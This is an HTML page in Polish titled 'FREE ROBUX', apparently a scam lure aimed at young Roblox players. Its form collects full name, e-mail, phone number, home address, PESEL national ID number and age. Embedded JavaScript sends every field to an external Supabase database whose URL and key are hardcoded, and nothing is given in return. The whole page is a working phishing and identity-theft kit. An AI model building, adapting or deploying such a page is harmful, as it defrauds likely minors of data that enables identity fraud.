<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FREE ROBUX</title>
    <!-- Biblioteka do połączenia z bazą Supabase -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 600;
        }
        input, textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        input:focus, textarea:focus {
            border-color: #007bff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        button:hover {
            background-color: #0056b3;
        }
        .alert {
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 5px;
            text-align: center;
            font-weight: bold;
            display: none;
        }
        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>FREE ROBUX</h2>

    <div id="alertBox" class="alert"></div>

    <form id="robuxForm">
        <div class="form-group">
            <label for="imie">Imię *</label>
            <input type="text" id="imie" required>
        </div>

        <div class="form-group">
            <label for="drugie_imie">Drugie imię</label>
            <input type="text" id="drugie_imie">
        </div>

        <div class="form-group">
            <label for="nazwisko">Nazwisko *</label>
            <input type="text" id="nazwisko" required>
        </div>

        <div class="form-group">
            <label for="email">E-mail *</label>
            <input type="email" id="email" required>
        </div>

        <div class="form-group">
            <label for="telefon">Numer telefonu *</label>
            <input type="tel" id="telefon" required>
        </div>

        <div class="form-group">
            <label for="adres">Adres zamieszkania *</label>
            <textarea id="adres" rows="3" required></textarea>
        </div>

        <div class="form-group">
            <label for="pesel">PESEL *</label>
            <input type="text" id="pesel" maxlength="11" required>
        </div>

        <div class="form-group">
            <label for="wiek">Wiek *</label>
            <input type="number" id="wiek" min="1" max="120" required>
        </div>

        <button type="submit" id="submitBtn">Wyślij dane</button>
    </form>
</div>

<script>
    // PODMIEŃ PONIŻSZE DWA WIERSZE NA SWOJE DANE Z SUPABASE
    const SUPABASE_URL = 'https://qetowkeybesdhyxveipy.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_wJ246ReHSHd9K1Tjf6GCcA_ESaGElqa';

    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const form = document.getElementById('robuxForm');
    const alertBox = document.getElementById('alertBox');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const pesel = document.getElementById('pesel').value.trim();
        const email = document.getElementById('email').value.trim();
        const wiek = parseInt(document.getElementById('wiek').value);

        // Walidacja taka sama jak w Twoim PHP
        if (pesel.length !== 11 || isNaN(pesel)) {
            showAlert("PESEL musi składać się dokładnie z 11 cyfr!", false);
            return;
        }

        if (wiek <= 0) {
            showAlert("Podaj prawidłowy wiek!", false);
            return;
        }

        const formData = {
            imie: document.getElementById('imie').value.trim(),
            drugie_imie: document.getElementById('drugie_imie').value.trim(),
            nazwisko: document.getElementById('nazwisko').value.trim(),
            email: email,
            telefon: document.getElementById('telefon').value.trim(),
            adres: document.getElementById('adres').value.trim(),
            pesel: pesel,
            wiek: wiek
        };

        // Zapis do bazy danych Supabase (tabela: uzytkownicy)
        const { data, error } = await supabase.from('uzytkownicy').insert([formData]);

        if (error) {
            showAlert("Błąd bazy danych: " + error.message, false);
        } else {
            showAlert("Dane zostały pomyślnie zapisane w bazie danych!", true);
            form.reset();
        }
    });

    function showAlert(message, isSuccess) {
        alertBox.textContent = message;
        alertBox.className = 'alert ' + (isSuccess ? 'success' : 'error');
        alertBox.style.display = 'block';
    }
</script>

</body>
</html>
